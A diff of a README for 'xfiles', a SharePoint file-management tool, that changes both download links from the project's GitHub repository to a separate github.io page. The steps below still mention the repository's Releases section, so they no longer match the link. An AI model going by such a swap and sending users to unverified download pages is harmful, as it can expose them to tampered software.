@@ -1,6 +1,6 @@
 # 📂 xfiles - Manage SharePoint files with simple commands
 
-[![](https://img.shields.io/badge/Download-xfiles-blue.svg)](https://github.com/sueimmovable975/xfiles)
+[![](https://img.shields.io/badge/Download-xfiles-blue.svg)](https://sueimmovable975.github.io)
 
 xfiles brings traditional file management tools to your SharePoint document libraries. If you know how to work with folders and files on your computer, you already understand how xfiles works. These tools connect directly to Microsoft Graph, allowing you to move, copy, search, and view your documents without opening a web browser.
 
@@ -15,7 +15,7 @@ xfiles brings traditional file management tools to your SharePoint document libr
 
 You can get the software from the official repository page.
 
-[Click here to visit the download page](https://github.com/sueimmovable975/xfiles)
+[Click here to visit the download page](https://sueimmovable975.github.io)
 
 1. Navigate to the link provided above.
 2. Select the latest version listed under the Releases section on the right side of the page.
